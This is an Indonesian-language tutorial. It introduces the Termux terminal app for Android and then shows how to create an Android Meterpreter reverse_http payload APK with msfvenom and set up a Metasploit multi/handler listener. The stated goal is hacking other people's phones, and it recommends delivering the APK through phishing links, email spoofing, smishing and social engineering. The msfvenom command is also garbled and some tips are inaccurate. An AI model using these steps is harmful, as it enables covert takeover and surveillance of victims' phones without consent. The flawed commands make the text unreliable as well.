## Apa itu Termux?

Pada dasarnya, Termux adalah aplikasi emulator terminal untuk Android serta *Linux environment* yang berjalan di ponsel mobile tanpa perlu akses root atau pengaturan khusus agar dapat menggunakannya.

Tool / paket tambahan juga tersedia dan dapat di pasang menggunakan *APT package manager*.

Yang membedakan Termux dari aplikasi emulator terminal lainnya adalah bahwa Termux sudah diatur sedemikian rupa sehingga *environment* di Termux menyerupai seperti dengan *environment* Linux Debian.

Karena *environment* Android berbeda dengan environment Linux pada umumnya maka di Termux dapat menginstall package yang biasa digunakan di system operasi Linux.

Dengan fitur dan pengaturan environment seperti di atas membuat Termux menjadi sangat spesial karena pengguna dapat menginstall *Penetration Testing Tools* atau tool untuk hacking seperti Metasploit dan net hunter di ponsel Android dengan hanya menggunakan Termux .

Termux juga menyediakan *package manager (APT*) untuk memudahkan menemukan dan menginstall paket yang dibutuhkan dari perangkat lunak yang disediakan oleh Termux.

Dalam tutorial ini saya akan menunjukkan cara bikin payload dasar untuk Android untuk hack ponsel orang lain tanpa harus menggunakan komputer.

Untuk melakukan itu hanya perlu menginstall Termux serta pasang beberapa paket terlebih dahulu, dan ini wajib dilakukan.

Untuk lebih jelasnya Anda bisa simak cara download aplikasi Termux serta pemasangan tool metasploit pada aplikasi Termux seperti berikut ini.

## Program Script Termux - Sadap HP

Setelah Metasploit berhasil terpasang, pengguna dapat memuat payloud Android dengan perintah kode Termux berikut:

**`msfvenom -p android/meterpreter/reverse_http lhost = "alamat IP Anda" 8080 r> "nama aplikasi".apk`**

* ***lhost***  = Alamat IP, dapat memeriksa alamat IP hanya dengan mengetik ipconfig di termux lalu tekan enter. akan muncul IP untuk beberapa saat.
* ***r>***  = kasih nama aplikasi payloud dengan .apk untuk android *(beri nama secara bebas)*

Setelah selesai menginstall, pengguna dapat memeriksa payload dengan input perintah "ls" di aplikasi Termux.

Sekarang ketika Anda telah berhasil membuat payload Anda dapat memulai metasploit listener untuk membuat sesi dengan smartphone target, untuk melakukannya cukup ketik perintah berikut ini:

`**$ msfconsole**`

`**$ use exploit/multi/handler**`

`**$ set payload android/meterpreter/reverse_http**`

`**$ set lhost = (IP Anda)**`

`**$ set lport = 8080**`

`**$ exploit**`

Saat exploit, metasploit akan memulai koneksi dari ponsel, sekarang setelah selesai dengan semua langkah di atas, harus mengirim payload yang sudah dibuat sebelumnya ke smartphone target.

Setelah target menginstall di ponsel, akan mendapatkan koneksi dari target.

Ada begitu banyak cara berbeda untuk mengirim payload ke target seperti link phishing, spoofing email, smishing, dan *social engineering* masih banyak lagi.

Jika mendapatkan error saat menginstall metasploit silahkan teliti lagi apakah ada langkah yang dilewatkan atau tidak.

Kebanyakan orang merasa sulit untuk menginstall metasploit atau memasang dan jangan buru-buru sehingga ada langkah yang tidak dilakukan.
